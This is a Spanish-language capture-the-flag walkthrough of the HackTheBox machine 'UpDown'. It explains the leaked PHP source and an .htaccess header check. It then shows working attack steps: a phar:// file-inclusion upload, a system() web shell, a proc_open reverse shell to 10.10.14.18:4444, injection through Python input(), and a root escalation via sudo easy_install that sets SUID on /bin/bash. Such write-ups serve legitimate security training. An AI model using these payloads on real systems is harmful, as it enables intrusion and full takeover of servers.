---
title: "UpDown"
---

# UpDown

```
git-dumper http://siteisup.htb/dev/.git/ ./repo
```

```bash
ffuf -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -mc all -ac
```

`.htaccess`
```
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

---

✅ **1️⃣ `SetEnvIfNoCase Special-Dev "only4dev" Required-Header`**

- Esta directiva crea una **variable de entorno** llamada `Required-Header` **si la cabecera HTTP `Special-Dev` existe (ignorando mayúsculas/minúsculas) y su valor es `"only4dev"`**.
    
- `SetEnvIfNoCase` funciona igual que `SetEnvIf` pero sin diferenciar mayúsculas de minúsculas.
    
- Ejemplo: si la petición tiene `Special-Dev: only4dev` → se define `Required-Header`.
    

---

✅ **2️⃣ `Order Deny,Allow`**

- Define el **orden de aplicación de reglas** de acceso:
    
    - Primero se aplican todas las reglas `Deny`.
        
    - Luego se aplican todas las reglas `Allow`.
        
    - Si hay conflicto, `Allow` sobrescribe `Deny`.
        

---

✅ **3️⃣ `Deny from All`**

- **Deniega todo el acceso por defecto**.
    

---

✅ **4️⃣ `Allow from env=Required-Header`**

- **Permite el acceso solo si la variable de entorno `Required-Header` está definida**.
    
- Es decir, **solo pasa quien envíe la cabecera `Special-Dev` con valor `only4dev`**.
    

---

```php
<?php
if(DIRECTACCESS){
        die("Access Denied");
}
?>
<!DOCTYPE html>
<html>

  <head>
    <meta charset='utf-8' />
    <meta http-equiv="X-UA-Compatible" content="chrome=1" />
    <link rel="stylesheet" type="text/css" media="screen" href="stylesheet.css">
    <title>Is my Website up ? (beta version)</title>
  </head>

  <body>

    <div id="header_wrap" class="outer">
        <header class="inner">
          <h1 id="project_title">Welcome,<br> Is My Website UP ?</h1>
          <h2 id="project_tagline">In this version you are able to scan a list of websites !</h2>
        </header>
    </div>

    <div id="main_content_wrap" class="outer">
      <section id="main_content" class="inner">
        <form method="post" enctype="multipart/form-data">
                            <label>List of websites to check:</label><br><br>
                                <input type="file" name="file" size="50">
                                <input name="check" type="submit" value="Check">
                </form>

<?php

function isitup($url){
        $ch=curl_init();
        curl_setopt($ch, CURLOPT_URL, trim($url));
        curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $f = curl_exec($ch);
        $header = curl_getinfo($ch);
        if($f AND $header['http_code'] == 200){
                return array(true,$f);
        }else{
                return false;
        }
    curl_close($ch);
}

if($_POST['check']){
  
        # File size must be less than 10kb.
        if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
        $file = $_FILES['file']['name'];
        
        # Check if extension is allowed.
        $ext = getExtension($file);
        if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){ #No checkea phar
                die("Extension not allowed!");
        }
  
        # Create directory to upload our file.
        $dir = "uploads/".md5(time())."/";
        if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
        $final_path = $dir.$file;
        move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
        
  # Read the uploaded file.
        $websites = explode("\n",file_get_contents($final_path));
        
        foreach($websites as $site){
                $site=trim($site);
                if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
                        $check=isitup($site);
                        if($check){
                                echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
                        }else{
                                echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
                        }       
                }else{
                        echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
                }
        }
        
  # Delete the uploaded file.
        @unlink($final_path);
}

function getExtension($file) {
        $extension = strrpos($file,"."); #Devuelve la posición del .
        return ($extension===false) ? "" : substr($file,$extension+1); #shell.php%00.txt
}
?>
      </section>
    </div>

    <div id="footer_wrap" class="outer">
      <footer class="inner">
        <p class="copyright">siteisup.htb (beta)</p><br>
        <a class="changelog" href="changelog.txt">changelog.txt</a><br>
      </footer>
    </div>

  </body>
</html>
```

```php
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
        define("DIRECTACCESS",false);
        $page=$_GET['page'];
        if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
                include($_GET['page'] . ".php");
        }else{
                include("checker.php");
        }       
?>
```


---

**¿Qué es un `.phar`?**  
Un archivo `.phar` (**PHP Archive**) es básicamente un archivo comprimido (como un `.zip` o `.tar`) que **empaqueta scripts PHP, librerías y recursos** en un solo archivo. Es como un `.jar` de Java, pero para PHP.

---

**¿Qué pasa si pones un `.phar` en un servidor Apache?**

Depende **totalmente** de **cómo se accede al archivo y cómo está configurado Apache/PHP**:

✅ **1. Si accedes directamente al `.phar` en la URL:**  
Por ejemplo:

```
http://tuweb.com/archivo.phar
```

Normalmente **Apache lo trata como un archivo estático**. No lo ejecuta. Simplemente **descargará el archivo** o devolverá su contenido como texto binario.  
**No se ejecuta el PHP dentro.**

---

✅ **2. Si incluyes el `.phar` desde otro script PHP:**  
Ejemplo:

```php
<?php
include 'archivo.phar';
```

Entonces **sí se ejecuta**. Es como si hicieras `include` de un `.php`.  
Esto es lo normal: usar `.phar` como librerías empaquetadas.

---

🚫 **3. Si usas `.phar` con flujos `phar://` o funciones especiales:**  
PHP permite leer contenido dentro del archivo usando `phar://`:

```php
$file = file_get_contents('phar://archivo.phar/index.php');
```

O incluso:

```php
include 'phar://archivo.phar/index.php';
```

En este caso **también se ejecuta**, porque lo estás incluyendo explícitamente.

___

# **LFI**:
```php
include($_GET['page'] . ".php");
```

Si subes algo que no legible (como un zip) peta el script y el archivo no se elimina:

```bash
zip info.m0b shell.php
```

```bash
http://dev.siteisup.htb/?page=phar://uploads/828afc50efeaa61d10099d92a4f618c5/info.m0b/shell #Y aquí el código metería .php
```

No podemos subir una shell como:

```php
<html><body><pre><?php if(isset($_GET['cmd'])){ system($_GET['cmd']); }?></pre></body></html>
```

Porque si subimos un phpinfo() nos tira varias `disable_functions`, entre ellas system.
Para saber si alguna nos permite ejecutar rce
Ejecutamos https://github.com/teambi0s/dfunc-bypasser.git sobre el archivo info.php

```bash
python2 dfunc-bypasser.py --url http://dev.siteisup.htb/?page=phar://uploads/5e31601b65f0062e32966f2f8e94fbb0/info.0xdf/info
```

Revershe shell usando proc_open:

```php
<?php
        $descspec = array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("pipe", "w")
        );
        $cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.18/4444 0>&1'";
        $proc = proc_open($cmd, $descspec, $pipes);
?>
```
# LFI2RCE

https://github.com/synacktiv/php_filter_chain_generator

```BASH
python php_filter_chain_generator.py --chain '<?php echo "M0B was here"; ?>'
```

___
# www-data a developer

Aquí hay RCE porque input evalua todo lo que le pasas:

```python
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
	print "Website is up"
else:
	print "Website is down"
```

```python
__import__('os').system('id')
```

# developer a root

Tiramos de gfto BINS
```
(ALL) NOPASSWD: /usr/local/bin/easy_install
```

`setup.py`
```python
__import__('os').system('chmod u+s /bin/bash')
```

```bash
sudo easy_install /tmp/ 
```
